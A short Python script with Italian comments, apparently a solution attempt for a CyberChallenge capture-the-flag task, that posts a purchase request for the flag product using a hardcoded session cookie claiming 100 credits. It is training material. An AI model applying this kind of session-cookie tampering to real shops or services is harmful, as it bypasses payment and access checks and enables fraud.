import requests

# URL del server
url = 'http://yasc.challs.cyberchallenge.it/buy'

# Impostazioni della sessione (usiamo un cookie per gestire la sessione)
session = requests.Session()

# Simuliamo di avere un credito sufficiente. Possiamo simulare il credito nella sessione se conosci il meccanismo di sessione.
# Per esempio, puoi inviare un cookie manualmente o fare in modo che il server lo imposti automaticamente.

# Aggiungi il cookie della sessione se necessario
# Assicurati di avere il cookie giusto dalla tua sessione precedente, altrimenti il server lo genererà per te
cookies = {'session': 'eyJjcmVkaXQiOjEwMH0.Z9DL1Q.N95-BmaspQoau3GOc7K-nkmqpOg'}

# ID del prodotto della flag
product_id = '43d27d66-150b-4b41-a1ee-6c3e02c0a67c'

# Fai una richiesta POST con il prodotto ID
response = session.post(url, data={'product_id': product_id}, cookies=cookies)

# Controlla la risposta
if response.status_code == 200:
    print("Acquisto effettuato con successo!")
    print(response.text)  # La risposta potrebbe contenere la flag o altre informazioni.
else:
    print(f"Errore durante l'acquisto: {response.status_code}")
    print(response.text)
